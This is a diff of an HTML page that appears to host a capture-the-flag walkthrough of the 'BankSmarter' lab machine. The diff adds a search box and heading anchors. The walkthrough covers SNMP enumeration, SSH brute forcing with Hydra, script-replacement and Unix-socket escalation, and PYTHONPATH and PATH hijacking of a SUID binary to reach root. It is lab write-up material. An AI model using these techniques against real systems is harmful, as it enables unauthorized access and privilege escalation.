@@ -96,6 +96,16 @@
     <span class="cursor" id="term-cursor" aria-hidden="true"></span>
     <span class="sr-only">Zerotrace Logs</span>
   </h1>
+  <!-- Search Box -->
+  <div class="search-container">
+    <input type="search"
+           id="siteSearch"
+           class="search-input"
+           placeholder="Search walkthroughs..."
+           aria-label="Search walkthroughs"
+           autocomplete="off">
+    <div id="searchResults" class="search-results" hidden></div>
+  </div>
 </header>
 
 <!-- Side hamburger control -->
@@ -153,7 +163,7 @@
 <div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>
 
 <section>
-  <h2>BankSmarter</h2>
+  <h2 id="banksmarter">BankSmarter</h2>
 
   <div class="machine-info">
     <ul>
@@ -164,12 +174,12 @@
     </ul>
   </div>
 
-  <h3>Overview</h3>
+  <h3 id="overview">Overview</h3>
   <p>As a senior operator on the Hack Smarter Red Team, the objective is to perform a penetration test against a standalone Linux server. The goal is to gain initial access, escalate privileges to root, and retrieve the final flag from <code>/root/</code>.</p>
 
-  <h2>Reconnaissance</h2>
+  <h2 id="reconnaissance">Reconnaissance</h2>
 
-  <h3><span class="step">[Step 1]</span> TCP Port Scan</h3>
+  <h3 id="tcp-port-scan"><span class="step">[Step 1]</span> TCP Port Scan</h3>
   <p>Starting with a comprehensive TCP port scan to identify open services:</p>
   <pre><code>$ nmap -p- -T4 -sC -sV 10.1.54.58 -o nmap_scan</code></pre>
 
@@ -177,7 +187,7 @@
   <pre><code>PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14</code></pre>
 
-  <h3><span class="step">[Step 2]</span> UDP Port Scan</h3>
+  <h3 id="udp-port-scan"><span class="step">[Step 2]</span> UDP Port Scan</h3>
   <p>Since TCP revealed minimal attack surface, I ran a UDP scan to discover additional services:</p>
   <pre><code>$ sudo nmap --top-ports 1000 -sU -T4 10.1.54.58 -o nmap_scan_udp</code></pre>
 
@@ -191,9 +201,9 @@
     Simple Network Management Protocol (SNMP) is used for monitoring and managing network devices. When configured with weak community strings (like "public"), it can leak sensitive system information including usernames, processes, and configuration details. SNMP is often overlooked during security assessments but can be a goldmine for attackers.
   </div>
 
-  <h2>Initial Access</h2>
+  <h2 id="initial-access">Initial Access</h2>
 
-  <h3><span class="step">[Step 3]</span> SNMP Enumeration</h3>
+  <h3 id="snmp-enumeration"><span class="step">[Step 3]</span> SNMP Enumeration</h3>
   <p>I used <code>snmpwalk</code> to query the SNMP service with the default community string:</p>
   <pre><code>$ snmpwalk -v 2c -c public 10.1.54.58</code></pre>
 
@@ -206,7 +216,7 @@
     <strong>Lesson:</strong> SNMP with default community strings is a common misconfiguration. Always enumerate UDP services, especially SNMP (161), TFTP (69), and DNS (53).
   </div>
 
-  <h3><span class="step">[Step 4]</span> Username Enumeration</h3>
+  <h3 id="username-enumeration"><span class="step">[Step 4]</span> Username Enumeration</h3>
   <p>I generated username permutations using username-anarchy to find the valid SSH username format:</p>
   <pre><code>$ ./username-anarchy --input-file names.txt --select-format first,flast,first.last,firstl,last > users.list
 
@@ -217,20 +227,20 @@ laynes
 lstanley
 stanley</code></pre>
 
-  <h3><span class="step">[Step 5]</span> SSH Brute Force</h3>
+  <h3 id="ssh-brute-force"><span class="step">[Step 5]</span> SSH Brute Force</h3>
   <p>Using Hydra to validate the discovered credentials against the username list:</p>
   <pre><code>$ hydra -L users.list -p '[REDACTED]' ssh://10.1.54.58</code></pre>
 
   <p><img src="../assets/banksmarter/hydra-ssh-bruteforce.png" alt="Hydra confirms valid credentials for layne.stanley"></p>
 
-  <h3><span class="step">[Step 6]</span> SSH Access</h3>
+  <h3 id="ssh-access"><span class="step">[Step 6]</span> SSH Access</h3>
   <p>Successfully authenticated as layne.stanley:</p>
   <pre><code>$ ssh layne.stanley@10.1.54.58
 layne.stanley@ip-10-1-54-58:~$</code></pre>
 
-  <h2>Privilege Escalation: layne.stanley to scott.weiland</h2>
+  <h2 id="privilege-escalation-layne-stanley-to-scott-weiland">Privilege Escalation: layne.stanley to scott.weiland</h2>
 
-  <h3><span class="step">[Step 7]</span> Process Monitoring</h3>
+  <h3 id="process-monitoring"><span class="step">[Step 7]</span> Process Monitoring</h3>
   <p>I noticed a script in the home directory owned by another user:</p>
   <pre><code>$ ls -la
 -rwxr-x--- 1 scott.weiland layne.stanley  127 Sep 12 12:45 bankSmarter_backup.sh</code></pre>
@@ -244,7 +254,7 @@ layne.stanley@ip-10-1-54-58:~$</code></pre>
   <pre><code>$ getent passwd 1002
 scott.weiland:x:1002:1002::/home/scott.weiland:/bin/bash</code></pre>
 
-  <h3><span class="step">[Step 8]</span> Script Replacement Attack</h3>
+  <h3 id="script-replacement-attack"><span class="step">[Step 8]</span> Script Replacement Attack</h3>
   <p>The script is owned by scott.weiland, but I have write access to the directory. This means I can rename the original script and create a malicious replacement:</p>
   <pre><code>$ mv bankSmarter_backup.sh bankSmarter_backup1.sh
 $ cat > bankSmarter_backup.sh << 'EOF'
@@ -269,9 +279,9 @@ $ chmod 600 /home/scott.weiland/.ssh/authorized_keys</code></pre>
     <strong>Key Insight:</strong> Even if you cannot write to a file, having write access to the parent directory enables file replacement attacks. This is why directory permissions are just as critical as file permissions.
   </div>
 
-  <h2>Privilege Escalation: scott.weiland to ronnie.stone</h2>
+  <h2 id="privilege-escalation-scott-weiland-to-ronnie-stone">Privilege Escalation: scott.weiland to ronnie.stone</h2>
 
-  <h3><span class="step">[Step 9]</span> Unix Socket Discovery</h3>
+  <h3 id="unix-socket-discovery"><span class="step">[Step 9]</span> Unix Socket Discovery</h3>
   <p>Continuing process monitoring, I found another service running:</p>
   <pre><code>CMD: UID=1003 PID=530 | /usr/bin/python3 /opt/bank/pty_server.py</code></pre>
 
@@ -290,15 +300,15 @@ $ chmod 600 /home/scott.weiland/.ssh/authorized_keys</code></pre>
     Unix domain sockets allow inter-process communication on the same machine. They appear as files in the filesystem and can be protected using standard file permissions. If permissions are misconfigured, unauthorized users can connect to privileged services running behind these sockets.
   </div>
 
-  <h3><span class="step">[Step 10]</span> Socket Exploitation</h3>
+  <h3 id="socket-exploitation"><span class="step">[Step 10]</span> Socket Exploitation</h3>
   <p>Using socat to connect to the exposed Unix socket:</p>
   <pre><code>$ socat - UNIX-CONNECT:/opt/bank/sockets/live.sock</code></pre>
 
   <p><img src="../assets/banksmarter/unix-socket-shell.png" alt="Successful shell as ronnie.stone via Unix socket"></p>
 
-  <h2>Privilege Escalation: ronnie.stone to root</h2>
+  <h2 id="privilege-escalation-ronnie-stone-to-root">Privilege Escalation: ronnie.stone to root</h2>
 
-  <h3><span class="step">[Step 11]</span> SUID Binary Discovery</h3>
+  <h3 id="suid-binary-discovery"><span class="step">[Step 11]</span> SUID Binary Discovery</h3>
   <p>Searching for SUID binaries revealed a custom binary:</p>
   <pre><code>$ find / -perm -4000 -type f 2>/dev/null
 /usr/local/bin/bank_backupd</code></pre>
@@ -314,7 +324,7 @@ $ chmod 600 /home/scott.weiland/.ssh/authorized_keys</code></pre>
 [REDACTED]
 [bank_backup.py] Backup completed successfully.</code></pre>
 
-  <h3><span class="step">[Step 12]</span> Python Script Analysis</h3>
+  <h3 id="python-script-analysis"><span class="step">[Step 12]</span> Python Script Analysis</h3>
   <p>The binary calls a Python script that imports hashlib:</p>
   <pre><code>#!/usr/bin/env python3
 import hashlib, time, os
@@ -328,7 +338,7 @@ print(hashlib.sha256(b"transaction data").hexdigest())</code></pre>
     Python searches for modules in directories specified by PYTHONPATH before standard locations. If an attacker can control PYTHONPATH and the SUID binary preserves environment variables, they can create a malicious module that gets loaded instead of the legitimate one, leading to code execution with elevated privileges.
   </div>
 
-  <h3><span class="step">[Step 13]</span> PYTHONPATH Exploitation</h3>
+  <h3 id="pythonpath-exploitation"><span class="step">[Step 13]</span> PYTHONPATH Exploitation</h3>
   <p>Created a malicious <code>hashlib.py</code> module:</p>
   <pre><code>$ cd /tmp
 $ cat > hashlib.py << 'EOF'
@@ -345,11 +355,11 @@ $ /usr/local/bin/bank_backupd</code></pre>
 
   <p><img src="../assets/banksmarter/pythonpath-root-shell.png" alt="Successful root shell via PYTHONPATH hijacking"></p>
 
-  <h2>Root Flag</h2>
+  <h2 id="root-flag">Root Flag</h2>
   <pre><code># cat /root/root.txt
 FLAG{...}</code></pre>
 
-  <h2>Alternative Method: PATH Hijacking</h2>
+  <h2 id="alternative-method-path-hijacking">Alternative Method: PATH Hijacking</h2>
   <p>The Python script uses a shebang that relies on the PATH environment variable:</p>
   <pre><code>#!/usr/bin/env python3</code></pre>
 
@@ -361,7 +371,7 @@ $ /usr/local/bin/bank_backupd
 # whoami
 root</code></pre>
 
-  <h2>Tools Used</h2>
+  <h2 id="tools-used">Tools Used</h2>
   <ul class="tools-list">
     <li><strong>Nmap</strong> - TCP/UDP port scanning</li>
     <li><strong>snmpwalk</strong> - SNMP enumeration</li>
@@ -371,7 +381,7 @@ root</code></pre>
     <li><strong>socat</strong> - Unix socket connection</li>
   </ul>
 
-  <h2>Attack Chain Summary</h2>
+  <h2 id="attack-chain-summary">Attack Chain Summary</h2>
   <div class="attack-chain">
     <ol>
       <li><strong>SNMP Leak:</strong> Discovered credentials in SNMP contact field</li>
@@ -382,7 +392,7 @@ root</code></pre>
     </ol>
   </div>
 
-  <h2>Lessons Learned</h2>
+  <h2 id="lessons-learned">Lessons Learned</h2>
   <div class="answer lessons-learned">
     <ol>
       <li><strong>Secure SNMP:</strong> Change default community strings and restrict access. Never store sensitive information in SNMP fields.</li>
